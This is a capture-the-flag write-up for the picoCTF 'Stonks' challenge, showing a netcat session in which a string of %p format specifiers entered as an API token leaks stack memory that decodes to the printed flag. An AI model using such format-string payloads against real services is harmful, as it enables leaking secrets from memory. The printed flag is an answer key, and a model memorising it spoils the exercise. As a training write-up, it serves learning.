# Stonks

## Descripción

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`

## Pistas

Okay, maybe I'd believe you if you find my API key.

## Solución

```
┌──(kali㉿kali)-[~/picoctf/binaryexplotation/stonks]
└─$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x80f53300x804b0000x80489c30xf7eebd800xffffffff0x10x80f31600xf7ef91100xf7eebdc7(nil)0x80f41800x60x80f53100x80f53300x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xfff4007d0xf7f26af80xf7ef94400x80b3c1000x1(nil)0xf7d88ce90xf7efa0c00xf7eeb5c00xf7eeb0000xfff40a580xf7d7968d0xf7eeb5c00x8048eca0xfff40a64(nil)0xf7f0df090x804b0000xf7eeb0000xf7eebe200xfff40a980xf7f13d500xf7eec8900x80b3c1000xf7eeb0000x804b0000xfff40a980x8048c860x80f31600xfff40a840xfff40a980x8048be90xf7eeb3fc(nil)0xfff40b4c0xfff40b440x10x10x80f31600x80b3c1000xfff40ab0(nil)(nil)0xf7d2efa10xf7eeb0000xf7eeb000(nil)0xf7d2efa10x10xfff40b440xfff40b4c0xfff40ad40x1(nil)0xf7eeb0000xf7f0e70a0xf7f26000(nil)0xf7eeb000(nil)(nil)0xc9f855890x8433f399(nil)(nil)(nil)0x10x8048630(nil)0xf7f13d500xf7f0e9600x804b0000x10x8048630(nil)0x80486620x8048b850x10xfff40b440x8048cd00x8048d300xf7f0e9600xfff40b3c0xf7f269400x10xfff40e78(nil)0xfff40eb10xfff40ebe0xfff40ec70xfff40ef60xfff40f2e0xfff40f490xfff40f6b0xfff40f73(nil)0x200xf7efeb500x210xf7efe0000x100x1f8bfbff0x60x10000x110x640x30x80480340x40x200x50x90x70xf7eff0000x8(nil)0x90x80486300xb0x4110xc0x4110xd0x4120xe0x4120x17
Portfolio as of Sat May 13 04:19:53 UTC 2023


6 shares of RPNI
1502 shares of RDBT
Goodbye!

0x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x346364620x616535320xfff4007d

picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
```

## Bandera

picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}

## Notas adicionales



## Referencias
- https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c